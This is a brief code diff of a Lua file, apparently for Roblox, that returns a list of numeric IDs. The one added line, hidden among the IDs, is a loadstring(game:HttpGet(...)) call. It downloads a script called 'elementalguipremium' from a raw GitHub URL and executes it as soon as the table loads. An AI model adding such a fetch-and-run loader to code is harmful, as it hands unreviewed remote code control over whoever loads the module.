@@ -32,4 +32,5 @@ return {
    909479836,
    7356284598,
    7706854865,
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/faisal31312/elemental/refs/heads/main/elementalguipremium"))(),
 }
